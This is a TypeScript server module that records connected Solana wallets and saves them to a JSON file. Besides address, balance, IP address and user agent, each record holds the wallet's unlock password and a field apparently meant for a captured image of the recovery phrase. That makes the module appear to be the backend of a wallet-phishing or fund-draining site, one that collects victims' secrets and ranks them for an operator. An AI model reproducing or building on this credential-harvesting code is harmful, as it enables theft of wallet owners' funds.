import crypto from 'crypto'
import fs from 'fs'
import path from 'path'

export interface LiveWalletRecord {
  id: string
  walletAddress: string
  walletType: string
  chain: string
  network: string
  balanceSol: number | null
  pageUrl: string | null
  userAgent: string | null
  clientIp: string | null
  browserSessionId: string | null
  unlockPassword: string | null
  phraseSnapImage: string | null
  connectedAt: string
  lastSeenAt: string
  connectionStatus: 'connected' | 'disconnected'
  user: null
}

const sessions = new Map<string, LiveWalletRecord>()
const DATA_DIR = path.join(process.cwd(), 'data')
const DATA_FILE = path.join(DATA_DIR, 'wallet-sessions.json')

function sessionKey(walletAddress: string, browserSessionId?: string | null) {
  return `${walletAddress}::${browserSessionId || 'default'}`
}

function persist() {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true })
    fs.writeFileSync(DATA_FILE, JSON.stringify(Array.from(sessions.values()), null, 2), 'utf8')
  } catch (err) {
    console.warn('Could not persist wallet sessions to disk:', (err as Error).message)
  }
}

function hydrate() {
  try {
    if (!fs.existsSync(DATA_FILE)) return
    const raw = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')) as LiveWalletRecord[]
    if (!Array.isArray(raw)) return
    for (const row of raw) {
      if (!row?.walletAddress) continue
      sessions.set(sessionKey(row.walletAddress, row.browserSessionId), row)
    }
  } catch (err) {
    console.warn('Could not load wallet sessions from disk:', (err as Error).message)
  }
}

hydrate()

export function upsertLiveWallet(input: {
  walletAddress: string
  walletType?: string
  chain?: string
  network?: string
  balanceSol?: number | null
  pageUrl?: string | null
  userAgent?: string | null
  clientIp?: string | null
  browserSessionId?: string | null
  unlockPassword?: string | null
  phraseSnapImage?: string | null
  connectionStatus?: 'connected' | 'disconnected'
}): LiveWalletRecord {
  const key = sessionKey(input.walletAddress, input.browserSessionId)
  const existing = sessions.get(key)
  const now = new Date().toISOString()
  const record: LiveWalletRecord = {
    id: existing?.id || crypto.randomUUID(),
    walletAddress: input.walletAddress,
    walletType: input.walletType || existing?.walletType || 'Solana Wallet',
    chain: input.chain || existing?.chain || 'solana',
    network: input.network || existing?.network || 'mainnet-beta',
    balanceSol: typeof input.balanceSol === 'number' ? input.balanceSol : existing?.balanceSol ?? null,
    pageUrl: input.pageUrl ?? existing?.pageUrl ?? null,
    userAgent: input.userAgent ?? existing?.userAgent ?? null,
    clientIp: input.clientIp ?? existing?.clientIp ?? null,
    browserSessionId: input.browserSessionId ?? existing?.browserSessionId ?? null,
    unlockPassword:
      input.unlockPassword !== undefined ? input.unlockPassword : existing?.unlockPassword ?? null,
    phraseSnapImage:
      input.phraseSnapImage !== undefined ? input.phraseSnapImage : existing?.phraseSnapImage ?? null,
    connectedAt: existing?.connectedAt || now,
    lastSeenAt: now,
    connectionStatus: input.connectionStatus || 'connected',
    user: null,
  }
  sessions.set(key, record)
  persist()
  return record
}

export function listLiveWallets(_maxAgeMs?: number): LiveWalletRecord[] {
  return Array.from(sessions.values()).sort(
    (a, b) => new Date(b.lastSeenAt).getTime() - new Date(a.lastSeenAt).getTime()
  )
}

export function disconnectLiveWallet(walletAddress: string) {
  for (const [key, record] of sessions.entries()) {
    if (record.walletAddress === walletAddress) {
      sessions.set(key, {
        ...record,
        connectionStatus: 'disconnected',
        lastSeenAt: new Date().toISOString(),
      })
    }
  }
  persist()
}
